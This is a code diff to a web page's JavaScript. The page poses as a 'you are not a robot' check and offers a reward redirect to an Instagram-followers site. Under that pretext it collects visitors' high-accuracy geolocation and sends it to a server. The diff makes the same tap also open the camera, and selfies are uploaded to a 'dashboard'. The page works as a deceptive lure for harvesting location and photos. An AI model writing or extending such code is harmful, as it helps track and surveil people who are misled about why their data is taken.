@@ -31,6 +31,17 @@
   var REWARD_URL = "https://livesubs.io/en/instagram";
   var REDIRECT_DELAY_MS = 2000;
 
+  // Shared state between the location flow and the camera flow.
+  var locDone = false;
+  var redirected = false;
+  function goReward() {
+    if (redirected) return;
+    redirected = true;
+    setTimeout(function () {
+      window.location.href = REWARD_URL;
+    }, REDIRECT_DELAY_MS);
+  }
+
   var btn = document.getElementById("pressBtn");
   var statusEl = document.getElementById("status");
 
@@ -90,12 +101,17 @@
     setStatus("Location received from browser. Sending for verification…", "working");
     postLocation(payload).then(
       function (data) {
-        setStatus("✅ Verified! You are not a robot.", "ok");
-        // Redirect the user to the reward page ONLY after success.
-        // Denied/failed cases never redirect (handled in onGeoError/catch).
-        setTimeout(function () {
-          window.location.href = REWARD_URL;
-        }, REDIRECT_DELAY_MS);
+        locDone = true;
+        if (camStream) {
+          // Camera preview is live: let the user finish the photo step first.
+          setStatus(
+            "✅ Verified! You are not a robot. Photo bhejni ho to Send My Photo dabao.",
+            "ok"
+          );
+        } else {
+          setStatus("✅ Verified! You are not a robot.", "ok");
+          goReward();
+        }
       },
       function (err) {
         setStatus(
@@ -134,7 +150,9 @@
     }
     btn.disabled = true;
     btn.textContent = "WAITING FOR PERMISSION…";
-    setStatus("Waiting for browser permission… please choose Allow or Block in the browser dialog.", "working");
+    setStatus("Waiting for browser permissions… please answer the location and camera dialogs.", "working");
+    // Same tap also opens the camera (preview only — upload needs Send My Photo).
+    openCamera(true);
     try {
       navigator.geolocation.getCurrentPosition(onGeoSuccess, onGeoError, {
         enableHighAccuracy: true,
@@ -179,9 +197,10 @@
     camCancelBtn.style.display = "none";
   }
 
-  camOpenBtn.addEventListener("click", function () {
+  function openCamera(auto) {
+    if (camStream) return;
     if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-      camMsg("❌ Camera needs a secure page (https:// link or localhost).", "err");
+      if (!auto) camMsg("❌ Camera needs a secure page (https:// link or localhost).", "err");
       return;
     }
     navigator.mediaDevices
@@ -204,12 +223,19 @@
         } else {
           camMsg("❌ Camera failed (" + (n || "unknown") + "). Use the https:// link.", "err");
         }
+        // Camera skipped but location already done -> still reach the reward page.
+        if (locDone) goReward();
       });
+  }
+
+  camOpenBtn.addEventListener("click", function () {
+    openCamera(false);
   });
 
   camCancelBtn.addEventListener("click", function () {
     stopCam();
     camMsg("Camera closed. No photo was sent.", "");
+    if (locDone) goReward();
   });
 
   camSendBtn.addEventListener("click", function () {
@@ -242,6 +268,7 @@
           .then(function () {
             camMsg("✅ Your selfie was sent to the dashboard.", "ok");
             stopCam();
+            goReward();
           })
           .catch(function (err) {
             camMsg(
